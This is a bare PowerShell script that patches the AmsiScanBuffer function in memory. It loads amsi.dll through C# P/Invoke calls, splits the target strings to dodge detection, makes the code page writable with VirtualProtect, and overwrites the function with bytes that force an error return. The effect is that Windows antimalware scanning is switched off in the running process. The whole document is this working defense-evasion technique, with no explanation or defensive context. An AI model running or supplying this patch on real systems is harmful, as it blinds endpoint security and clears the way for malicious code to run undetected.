$Meh = @"

using System;
using System.Runtime.InteropServices;

public class Meh {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Meh

$LoadLibrary = [Meh]::LoadLibrary("am" + "si.dll")
$Address = [Meh]::GetProcAddress($LoadLibrary, "Ams" + "iSca" + "nBuffer")
$p = 0
[Meh]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
  